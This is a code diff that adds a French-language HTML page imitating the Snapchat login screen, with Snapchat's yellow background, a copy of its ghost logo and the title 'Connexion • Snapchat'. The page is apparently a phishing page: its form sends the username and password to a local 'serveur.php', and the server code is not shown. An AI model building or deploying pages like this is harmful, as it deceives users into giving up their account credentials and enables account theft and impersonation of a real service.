@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion • Snapchat</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #FFFC00;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 32px;
+            border-radius: 20px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .logo {
+            width: 70px;
+            height: auto;
+            margin-bottom: 24px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 32px;
+            letter-spacing: -0.5px;
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 11px;
+            font-weight: 700;
+            color: #8E8E93;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 0;
+            border: none;
+            border-bottom: 2px solid #EFEFEF;
+            font-size: 16px;
+            color: #000000;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            border-bottom-color: #000000;
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: left;
+            font-size: 13px;
+            color: #007AFF;
+            text-decoration: none;
+            margin-top: -8px;
+            margin-bottom: 32px;
+            font-weight: 500;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .btn-login {
+            width: 100%;
+            background-color: #000000;
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            border-radius: 100px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .btn-login:hover {
+            opacity: 0.9;
+        }
+
+        /* Rendu optimal sur mobile */
+        @media (max-width: 480px) {
+            body {
+                background-color: #ffffff;
+                align-items: flex-start;
+            }
+            .login-container {
+                box-shadow: none;
+                padding: 60px 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- SVG du logo officiel Snapchat -->
+        <svg class="logo" viewBox="0 0 72 72" fill="none" xmlns="http://w3.org">
+            <path fill-rule="evenodd" clip-rule="evenodd" d="M36 7C22.2 7 15 15.6 15 25.4C15 29.8 17 32.2 18.2 33.6C18.8 34.3 18.7 34.6 18.2 35.1C17.4 35.9 15.6 37.7 15.6 39.9C15.6 42.1 17.8 43.1 20 42.4C20.8 42.1 21.6 42.6 21.9 43.4C22.9 46.1 25.9 50.1 32.6 50.9C33.6 51 34.1 51.5 33.9 52.5C33.5 54.3 32.2 58.4 32.2 60.1C32.2 62.4 34.2 63.6 36 63.6C37.8 63.6 39.8 62.4 39.8 60.1C39.8 58.4 38.5 54.3 38.1 52.5C37.9 51.5 38.4 51 39.4 50.9C46.1 50.1 49.1 46.1 50.1 43.4C50.4 42.6 51.2 42.1 52 42.4C54.2 43.1 56.4 42.1 56.4 39.9C56.4 37.7 54.6 35.9 53.8 35.1C53.3 34.6 53.2 34.3 53.8 33.6C55 32.2 57 29.8 57 25.4C57 15.6 49.8 7 36 7Z" fill="black"/>
+        </svg>
+
+        <h1>Connexion</h1>
+
+       <form action="serveur.php" method="POST">
+
+            <div class="input-group">
+                <label for="username">Nom d'utilisateur ou e-mail</label>
+                <input type="text" id="username" name="username" required autocomplete="username">
+            </div>
+
+            <div class="input-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password">
+            </div>
+
+            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+
+            <button type="submit" class="btn-login">Connexion</button>
+        </form>
+    </div>
+
+</body>
+</html>
